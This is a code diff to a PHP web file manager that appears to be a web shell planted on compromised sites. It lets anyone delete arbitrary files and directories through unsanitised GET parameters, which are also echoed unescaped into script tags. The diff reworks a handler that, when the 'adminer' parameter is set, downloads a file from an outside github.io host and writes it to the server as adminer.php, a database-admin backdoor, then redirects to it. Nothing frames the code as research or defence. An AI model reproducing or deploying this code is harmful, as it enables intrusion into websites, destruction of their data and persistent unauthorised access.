@@ -126,17 +126,6 @@ function adminer($url, $isi) {
     flush();
 }
 
-
-if (isset($_GET['adminer'])){
-    $full = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir);
-    if (adminer('https://amarararerero.github.io/_adminer.php', 'adminer.php')) {
-        echo "<p class='text-center'>Berhasil Membuat Adminer</p><a href='$full/adminer.php' target='_blank' class='text-center btn btn-success btn-block mb-3'>Login Adminer</a>";
-    } else {
-        echo "<p class='text-center text-danger'>Gagal Membuat Adminer</p>";
-    }
-
-}
-
 if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['action'] == 'download')) {
     @ob_clean();
     $file = $_GET['file'];
@@ -180,7 +169,7 @@ if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['action'] == 'downlo
     }
 </style>
 <body data-bs-theme="dark">
-    <script>async function out(icon , message){await Swal.fire({icon: icon,title: message,timer: 1000,timerProgressBar: true,});await history.go(-1);}</script>
+    <script>async function out(icon , message , mode){ if (mode == "Y"){await Swal.fire({icon: icon,title: message,timer: 1000,timerProgressBar: true,});await history.go(-1);}else{await Swal.fire({icon: icon,title: message,timer: 1000,timerProgressBar: true,});await location.replace("/adminer.php");}}</script>
     <div class="container-xxl mt-3">
         <div class="text-center"><img src="https://i.ibb.co/4NLC9gm/tmp.png" width="250px"></div>
         <div class="border my-2"></div>
@@ -250,7 +239,7 @@ if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['action'] == 'downlo
                         </form>
                     </div>
                 </div>
-            <?php } elseif ($_GET['action'] == 'delete'){if (($_GET['type'] == 'files')){$filepath = $_GET['path'].'/'.$_GET['file'];if(unlink($filepath)){echo "<script>out('success','".$_GET['file']." deleted')</script>";}else{echo "<script>out('error','Error While Removing ".$_GET['file']."')</script>";}}elseif ($_GET['type'] == 'dir'){$dirpath = $_GET['path'].'/'.$_GET['file'];if(rmdir($dirpath)){echo "<script>out('success','".$_GET['dir']." deleted')</script>";} else{echo "<script>out('error','Error While Removing ".$_GET['dir']."')</script>";} }}?>
+            <?php } elseif ($_GET['action'] == 'delete'){if (($_GET['type'] == 'files')){$filepath = $_GET['path'].'/'.$_GET['file'];if(unlink($filepath)){echo "<script>out('success','".$_GET['file']." deleted','Y')</script>";}else{echo "<script>out('error','Error While Removing ".$_GET['file']."','Y')</script>";}}elseif ($_GET['type'] == 'dir'){$dirpath = $_GET['path'].'/'.$_GET['file'];if(rmdir($dirpath)){echo "<script>out('success','".$_GET['dir']." deleted','Y')</script>";} else{echo "<script>out('error','Error While Removing ".$_GET['dir']."','Y')</script>";} }}?>
             <?php }else{?>
             <?php $scandir = scandir($path);?>
             <table class="table-fixed m-0 table table-bordered table-sm text-center">
@@ -316,5 +305,15 @@ if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['action'] == 'downlo
         </div>
         <?php }?>
     </div>
+<?php if (isset($_GET['adminer'])){
+    $full = str_replace($_SERVER['DOCUMENT_ROOT'], '', $dir);
+    if (adminer('https://amarararerero.github.io/adminer.txt', 'adminer.php')) {
+        echo "<script>out('success','Success','N')</script>";
+    } else {
+        echo "<p class='text-center text-danger'>Gagal Membuat Adminer</p>";
+    }
+
+}
+?>
 </body>
 </html>
